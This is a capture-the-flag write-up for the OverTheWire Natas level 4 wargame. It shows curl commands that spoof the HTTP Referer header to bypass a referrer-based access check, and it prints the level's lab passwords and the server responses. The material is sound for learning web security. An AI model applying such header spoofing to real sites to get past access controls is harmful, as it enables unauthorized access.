***Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"***

When I hit the "refresh page" link below this, the message changes to:

***Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"***

The refresh link on the page takes me to index.php on this subdomain, and is subsequently a clue: the web app is keeping track of what URL is being used to access the page. If we can spoof the URL that is being used to access the page, then we can trick it to think we're on the natas5 subdomain. 

This can be accomplished by modifying the Referer request header. Using the browser inspector, we can see in the request headers that the Referer is currently set to `http://natas4.natas.labs.overthewire.org/`, when we need this changed to the natas5 subdomain address. To make the swap, we can either use a tool/extension, or we can use a curl call on a CLI. To test the normal response from a curl call:

**`raj@arch:~$ curl -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm natas4.natas.labs.overthewire.org`**  
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

This gives us the HTML source of the page. Now let's modify our curl call to spoof the Referer request header:

**`raj@arch:~$ curl -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm --referer "http://natas5.natas.labs.overthewire.org/" natas4.natas.labs.overthewire.org`**  
```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
